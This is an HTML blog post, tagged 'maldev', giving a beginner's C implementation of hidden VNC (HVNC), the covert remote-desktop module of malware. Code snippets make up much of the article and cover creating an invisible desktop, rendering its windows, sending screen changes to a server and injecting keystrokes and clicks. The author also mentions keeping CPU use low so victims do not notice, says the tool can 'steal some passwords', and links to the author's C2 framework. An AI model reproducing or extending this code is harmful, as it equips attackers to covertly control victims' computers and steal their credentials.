@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="A beginner&#39;s introduction to HVNC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intro to HVNC">
+<meta property="og:url" content="http://example.com/2024/11/02/intro-to-hvnc/index.html">
+<meta property="og:site_name" content="fern&#39;s blog">
+<meta property="og:description" content="A beginner&#39;s introduction to HVNC">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/media/hvnc/demo.png">
+<meta property="article:published_time" content="2024-11-02T05:05:59.000Z">
+<meta property="article:modified_time" content="2025-09-16T15:07:04.708Z">
+<meta property="article:author" content="fern">
+<meta property="article:tag" content="maldev">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/media/hvnc/demo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Intro to HVNC</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/19/verysecretstorage/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/01/whoogle-rce/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/02/intro-to-hvnc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/02/intro-to-hvnc/&text=Intro to HVNC"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/02/intro-to-hvnc/&is_video=false&description=Intro to HVNC"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Intro to HVNC&body=Check out this article: http://example.com/2024/11/02/intro-to-hvnc/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/02/intro-to-hvnc/&name=Intro to HVNC&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/02/intro-to-hvnc/&t=Intro to HVNC"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Creating-the-hidden-desktop"><span class="toc-number">2.</span> <span class="toc-text">Creating the hidden desktop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Window-Rendering"><span class="toc-number">3.</span> <span class="toc-text">Window Rendering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-Z-order"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse Z-order</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-buffering"><span class="toc-number">3.2.</span> <span class="toc-text">Double buffering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rendering"><span class="toc-number">3.3.</span> <span class="toc-text">Rendering</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Data-transfer"><span class="toc-number">4.</span> <span class="toc-text">Data transfer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Optimization"><span class="toc-number">4.1.</span> <span class="toc-text">Optimization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compression"><span class="toc-number">4.2.</span> <span class="toc-text">Compression</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sending-the-data"><span class="toc-number">4.3.</span> <span class="toc-text">Sending the data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-input"><span class="toc-number">5.</span> <span class="toc-text">User input</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Keyboard"><span class="toc-number">5.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mouse"><span class="toc-number">5.2.</span> <span class="toc-text">Mouse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Intro to HVNC
+    </h1>
+
+
+
+    <div class="meta">
+      fern
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-02T05:05:59.000Z" class="dt-published" itemprop="datePublished">2024-11-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/maldev/" rel="tag">maldev</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In this blog, I will showcase how to implement a very simple HVNC. Now I know that many others, including <a target="_blank" rel="noopener" href="https://www.malwaretech.com/2015/09/hidden-vnc-for-beginners.html">MalwareTech</a> have written great blog posts on HVNC, but they all seem to be lacking implementation details. As these days nearly every script kiddie can just use a copy of the (horribly designed) TinyNuke HVNC, I feel that it’s rather pointless to not talk about HVNC for the sake of reducing script kiddies. So today I will focus on the theory and implementation of a HVNC, in pure C, with some efficiency optimizations to make it actually usable (versus the unusably slow TinyNuke).</p>
+<h2 id="Creating-the-hidden-desktop"><a href="#Creating-the-hidden-desktop" class="headerlink" title="Creating the hidden desktop"></a>Creating the hidden desktop</h2><p>So before we even start doing anything with HVNC, we need the hidden desktop. We will use the rare <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createdesktopa">CreateDesktopA</a> WinAPI to create a desktop.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* desktop_name = <span class="string">&quot;haxxordesktop12345&quot;</span>;</span><br><span class="line">dsk = OpenDesktopA(desktop_name, <span class="number">0</span>, FALSE, GENERIC_ALL);</span><br><span class="line"><span class="keyword">if</span>(dsk==<span class="literal">NULL</span>)</span><br><span class="line">    dsk = CreateDesktopA(desktop_name, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, GENERIC_ALL, <span class="literal">NULL</span>);</span><br><span class="line">SetThreadDesktop(dsk);</span><br></pre></td></tr></table></figure>
+<p>So first we try to <code>OpenDesktopA</code>, see if we have created the desktop before, if not, <code>CreateDesktopA</code>, then finally <code>SetThreadDesktop</code>. Quite self-explanatory. Note that the desktop made by <code>CreateDesktopA</code> is <strong>completely invisible</strong>, which is why this feature is incredibly attractive to malware developers.</p>
+<h2 id="Window-Rendering"><a href="#Window-Rendering" class="headerlink" title="Window Rendering"></a>Window Rendering</h2><p>This is the crux of HVNC design. The problem with HVNC, is that Windows does <strong>not</strong> automatically render all the windows present on the hidden desktop (that makes sense, as the user can’t see it anyways), but this is terrible for us, as we cannot just speedrun and use <code>GetDC(NULL)</code> with a <code>BitBlt</code> (this works for regular VNC) and expect things to work out. We need to manually render everything! So let us start our journey, with the reverse Z-order.</p>
+<h3 id="Reverse-Z-order"><a href="#Reverse-Z-order" class="headerlink" title="Reverse Z-order"></a>Reverse Z-order</h3><p>So, what is this Z-order? According to <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/winmsg/window-features#z-order">Microsoft Docs</a>: </p>
+<blockquote>
+<p>The <em>z-order</em> of a window indicates the window’s position in a stack of overlapping windows. This window stack is oriented along an imaginary axis, the z-axis, extending outward from the screen. The window at the top of the z-order overlaps all other windows. The window at the bottom of the z-order is overlapped by all other windows.</p>
+</blockquote>
+<p>So, what we want to do, is get the bottommost window, the last of the Z-order, and keep going up one window, until we hit the topmost window!</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HWND curw = GetWindow(GetTopWindow(<span class="literal">NULL</span>), GW_HWNDLAST);</span><br><span class="line"><span class="keyword">while</span>(curw != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsWindowVisible(curw))</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">    curw = GetWindow(curw, GW_HWNDPREV);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We ignore all invisible windows to save CPU. Now that we know how to walk the Z-order, time to go on to rendering the windows!</p>
+<h3 id="Double-buffering"><a href="#Double-buffering" class="headerlink" title="Double buffering"></a>Double buffering</h3><p>In order to have the windows be properly rendered later on, we need double buffering. We can do it like so:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetWindowLongA(hwnd, GWL_EXSTYLE, GetWindowLongA(hwnd, GWL_EXSTYLE) | WS_EX_COMPOSITED);</span><br></pre></td></tr></table></figure>
+<p>We turn on the flag of <code>WS_EX_COMPOSITED</code> on the window, so that double buffering is enabled. Now, let’s combine this with our previous code,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HWND curw = GetWindow(GetTopWindow(<span class="literal">NULL</span>), GW_HWNDLAST);</span><br><span class="line"><span class="keyword">while</span>(curw != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsWindowVisible(curw))</span><br><span class="line">        SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) | WS_EX_COMPOSITED);</span><br><span class="line">    curw = GetWindow(curw, GW_HWNDPREV);</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">50</span>);</span><br></pre></td></tr></table></figure>
+<p>We put a <code>Sleep</code> at the end, to give all the windows some time to process this change, before we start rendering them.</p>
+<h3 id="Rendering"><a href="#Rendering" class="headerlink" title="Rendering"></a>Rendering</h3><p>For this part, we simply walk the Z-order again, and send a call to <code>PrintWindow</code>. While I have heard that some applications do not handle <code>WM_PRINT</code> (the call sent by <code>PrintWindow</code>) correctly, leading to no rendering, I have tested all the basic software that a HVNC operator may use (including CMD, Powershell, Chrome, and others), and have not found any that pose this problem. So to reduce complexity, I omit this segment.</p>
+<p>So, we create a <code>MemDC</code> walk the Z-order, call <code>PrintWindow</code> and <code>BitBlt</code> on each window, from bottom to the top, until we have rendered all the windows!</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HDC memdc = CreateCompatibleDC(hdc);</span><br><span class="line">HBITMAP hbitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);</span><br><span class="line">SelectObject(memdc, hbitmap);</span><br><span class="line"><span class="keyword">while</span>(curw != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!IsWindowVisible(curw)) <span class="keyword">goto</span> next;</span><br><span class="line">    RECT wRect;</span><br><span class="line">    GetWindowRect(curw, &amp;wRect);</span><br><span class="line">    HDC wdc = CreateCompatibleDC(hdc);</span><br><span class="line">    HBITMAP wbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);</span><br><span class="line">    SelectObject(wdc, wbitmap);</span><br><span class="line">    <span class="keyword">if</span> (PrintWindow(curw, wdc, <span class="number">0</span>))</span><br><span class="line">        BitBlt(memdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, wdc, <span class="number">0</span>, <span class="number">0</span>, SRCCOPY);</span><br><span class="line">    SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) ^ WS_EX_COMPOSITED);</span><br><span class="line">    DeleteObject(wbitmap);</span><br><span class="line">    DeleteDC(wdc);</span><br><span class="line">next:</span><br><span class="line">    curw = GetWindow(curw, GW_HWNDPREV);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We also unset <code>WS_EX_COMPOSITED</code> on every window after printing it, as double buffering takes up a lot of CPU, and we want it to be enabled as little as possible, to prevent high CPU usage that may seem suspicious to end users.</p>
+<p>Great! By this point, we have a full render of the hidden desktop window in <code>hbitmap</code>. Next step, is to transmit this data to the server.</p>
+<h2 id="Data-transfer"><a href="#Data-transfer" class="headerlink" title="Data transfer"></a>Data transfer</h2><h3 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h3><p>In order to decrease data transfer (and hence latency), we only want to transmit the bytes that have been changed. I will do a very simple method, to draw a rectangle that encompasses all the changed pixels, and only transmit that. While this is definitely not the best algorithm, it is simple, and highly effective for things like typing, where only a few pixels change at a time.</p>
+<p>First we get the bits of the <code>hbitmap</code>,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD cb = GetBitmapBits(hbitmap, <span class="number">10000000</span>, bitmap);</span><br><span class="line"><span class="type">int</span> bpb = cb/(rect.right*rect.bottom);</span><br></pre></td></tr></table></figure>
+
+<p>Now find the rectangle,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> top = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> topset = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> left = rect.right;</span><br><span class="line"><span class="type">int</span> bot = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> right = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cb;i+=bpb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(pastbm+i, bitmap+i, bpb)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> y = i/(bpb*rect.right);</span><br><span class="line">        <span class="keyword">if</span>(!topset)&#123;</span><br><span class="line">            top = y;</span><br><span class="line">            topset = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> x = (i/bpb)%rect.right;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;left) left = x;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;right) right = x;</span><br><span class="line">        <span class="keyword">if</span>(y&gt;bot) bot = y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(left==rect.right) left=<span class="number">0</span>;</span><br><span class="line">bot++;</span><br><span class="line">right++;</span><br><span class="line"><span class="keyword">if</span>(bot&gt;rect.bottom) bot = rect.bottom;</span><br><span class="line"><span class="keyword">if</span>(right&gt;rect.right) right = rect.right;</span><br></pre></td></tr></table></figure>
+
+<p>So now, <code>top</code>, <code>left</code>, <code>bot</code>, and <code>right</code>, store the rectangle of changed pixels! Anything outside that rectangle, contains pixels that are identical to that of the previous frame, so we can omit that.</p>
+<h3 id="Compression"><a href="#Compression" class="headerlink" title="Compression"></a>Compression</h3><p>After this, we can compress the raw bitmap, into a compressed format of your choice. I used PNG for this, I will omit the code as it’s not very important, merely use of GDIPlus functions. You can see the implementation in the linked repository later.</p>
+<h3 id="Sending-the-data"><a href="#Sending-the-data" class="headerlink" title="Sending the data"></a>Sending the data</h3><p>Finally, we just broadcast the rectangle, along with the coordinates of the top-left corner. This will be rendered on the server. Again, implementation of this is not too important, just use of some Winsock functions.</p>
+<h2 id="User-input"><a href="#User-input" class="headerlink" title="User input"></a>User input</h2><p>Now, a desktop is useless if you cannot interact with it. So, we need a way to input user data. We assume we already have the instructions of what operation to do (ie keyboard or mouse action), as that is just yet another Winsock action.</p>
+<h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>The keyboard is relatively simple, as it can only really be sent to the topmost window. So we just get that, and send the keycode to it with a <code>PostMessage</code> call.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hwd = GetTopWindow(<span class="literal">NULL</span>);</span><br><span class="line">PostMessage(hwd, WM_KEYDOWN, keycode, <span class="number">0</span> );</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mouse"><a href="#Mouse" class="headerlink" title="Mouse"></a>Mouse</h3><p>The mouse is more complicated, as you could be clicking on a window that is not in focus. So we start with a <code>WindowFromPoint</code> call, and from there, recursively call <code>ChildWindowFromPoint</code>, as <code>WindowFromPoint</code> does not consider disabled or hidden windows, according to the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-windowfrompoint">Microsoft Docs</a>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POINT point;</span><br><span class="line">point.x = x;</span><br><span class="line">point.y = y;</span><br><span class="line">hwd = WindowFromPoint(point);</span><br><span class="line"><span class="keyword">for</span> (HWND currHwnd = hwd;;)&#123;</span><br><span class="line">    hwd = currHwnd;</span><br><span class="line">    ScreenToClient(hwd, &amp;point);</span><br><span class="line">    currHwnd = ChildWindowFromPoint(hwd, point);</span><br><span class="line">    <span class="keyword">if</span> (currHwnd == <span class="literal">NULL</span> || currHwnd == hwd)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>ScreenToClient</code> is used to convert global coordinates to the coordinates of the window, as each window is only aware of itself, and not the global coordinate system. Now, we just need to send a click to the window we found, with a <code>PostMessage</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPARAM lParam = MAKELPARAM(point.x, point.y);</span><br><span class="line">PostMessage(hwd, WM_LBUTTONDOWN, <span class="number">0</span>, lParam);</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line">PostMessage(hwd, WM_LBUTTONUP, <span class="number">0</span>, lParam);</span><br></pre></td></tr></table></figure>
+<p>To make things simple, I only implement single click, but it is trivial to make other clicks supported. Just like that, we have implemented a very simple HVNC! We can open Chrome, steal some passwords, whatever it is HVNC is used for.</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The code for this repo can be found at <a target="_blank" rel="noopener" href="https://github.com/fern89/hvnc/">https://github.com/fern89/hvnc/</a>. Note that this HVNC is incredibly limited, and does not support things like closing, minimizing, moving around windows, and basically all the window-manager functionalities. For a more complex HVNC, you can refer to the HVNC found in my <a target="_blank" rel="noopener" href="https://github.com/fern89/C2/blob/main/agent/vnc/hvnc.h">C2 framework</a>, or the <a target="_blank" rel="noopener" href="https://github.com/Meltedd/HVNC/blob/main/Client/HiddenDesktop.cpp">TinyNuke implementation</a>. Overall, this post merely is meant to serve as a beginner’s introduction to HVNC, and our goal for this project is just to be able to open YouTube and play a rickroll.</p>
+<p><img src="/media/hvnc/demo.png" alt="Image of the Rickroll demo"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Creating-the-hidden-desktop"><span class="toc-number">2.</span> <span class="toc-text">Creating the hidden desktop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Window-Rendering"><span class="toc-number">3.</span> <span class="toc-text">Window Rendering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-Z-order"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse Z-order</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-buffering"><span class="toc-number">3.2.</span> <span class="toc-text">Double buffering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rendering"><span class="toc-number">3.3.</span> <span class="toc-text">Rendering</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Data-transfer"><span class="toc-number">4.</span> <span class="toc-text">Data transfer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Optimization"><span class="toc-number">4.1.</span> <span class="toc-text">Optimization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compression"><span class="toc-number">4.2.</span> <span class="toc-text">Compression</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sending-the-data"><span class="toc-number">4.3.</span> <span class="toc-text">Sending the data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-input"><span class="toc-number">5.</span> <span class="toc-text">User input</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Keyboard"><span class="toc-number">5.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mouse"><span class="toc-number">5.2.</span> <span class="toc-text">Mouse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/02/intro-to-hvnc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/02/intro-to-hvnc/&text=Intro to HVNC"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/02/intro-to-hvnc/&is_video=false&description=Intro to HVNC"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Intro to HVNC&body=Check out this article: http://example.com/2024/11/02/intro-to-hvnc/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/02/intro-to-hvnc/&title=Intro to HVNC"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
